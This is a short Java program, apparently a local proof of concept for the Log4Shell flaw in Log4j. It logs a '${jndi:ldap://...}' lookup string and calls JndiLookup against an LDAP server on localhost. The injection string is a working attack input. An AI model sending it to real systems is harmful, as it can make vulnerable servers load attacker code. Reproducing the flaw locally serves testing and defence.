import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.lookup.JndiLookup;

public class Log4JExploit {
    static Logger logger = LogManager.getLogger(Log4JExploit.class);

    public static void main(String... args) {
        String javaVersion = "${java:version}";
        String ldapUrl = "${jndi:ldap://localhost:1389/Test}";

        System.out.println(javaVersion);
        logger.error(javaVersion);
        logger.error(ldapUrl);


        Log4jLogEvent l4je = new Log4jLogEvent();
        JndiLookup lkp = new JndiLookup();
        String result = lkp.lookup(l4je, "ldap://localhost:1389/Test");
        System.out.println(result);

        System.out.println("Sleeping.. Press ctrl+c to quit..");

        while (true) {
            try {
                Thread.sleep(60000);
                System.out.println("Sleeping.. Press ctrl+c to quit..");
            } catch (Exception ex) {
                System.out.println(ex);
            }
        }
    }
}